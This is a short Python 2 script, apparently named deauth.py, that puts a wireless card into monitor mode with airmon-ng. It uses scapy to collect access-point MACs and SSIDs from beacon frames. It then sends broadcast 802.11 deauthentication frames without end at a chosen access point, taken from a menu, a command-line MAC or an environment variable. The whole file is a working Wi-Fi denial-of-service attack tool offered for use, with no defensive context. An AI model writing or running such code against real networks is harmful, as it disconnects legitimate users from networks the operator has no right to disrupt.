import sys
import subprocess
import os

ap_list = dict()
pktcount=0
ssidcount=0

def execuitCommand(cmd):
    return subprocess.call(cmd,shell=True)

try:
    from scapy.all import *
except:
    print "scapy module not found. So, installing... "
    execuitCommand("apt-get install python-scapy")

def startAirmon():
    if execuitCommand("airmon-ng | grep mon0")==0:
        print "Found mon0 Interface..."
    else:
        print "Starting monitoring interface on the wlan0..."
        if execuitCommand("airmon-ng start wlan0")!=0:
            print "airmon-ng not found. Please install aircrack-ng. RUN 'apt-get install aircrack-ng'"
            sys.exit()

def packetHandler(pkt):
    global pktcount,ssidcount
    pktcount+=1
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in ap_list :
        ssidcount+=1
        ap_list.setdefault(pkt.addr2,[ssidcount,pkt.info])

def stopFilter(x): #Stop the Sniffing if packet reachs the count
    global pktcount
    if pktcount==10000:
        return True
    else:
        return False

try:
    input=os.environ["DEAUTH"]
    startAirmon()
except:
    if len(sys.argv)==1:
        startAirmon()
        print "Sniffing wifi signals. Please wait....\n"
        sniff(iface="mon0", prn = packetHandler, stop_filter=stopFilter)
        print "Please choose SSID to send deauthentication packets"
        ap=dict()
        while True:
            for mac, ssid in ap_list.iteritems():
                print str(ssid[0]).ljust(2," "),mac.ljust(20," "),ssid[1]
                ap.setdefault(ssid[0],mac)
            x=int(raw_input(">>"))
            input=ap[x]
            if x in ap:
                break

    elif len(sys.argv)==2:
        input=sys.argv[1]
        startAirmon()

    elif len(sys.argv)>2:
        print "Usage: sudo python deauth.py [MAC]"
        sys.exit()

pkt=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=input,addr3=input)/Dot11Deauth()

while True:
    sendp(pkt, iface="mon0",count=1, inter=.2)
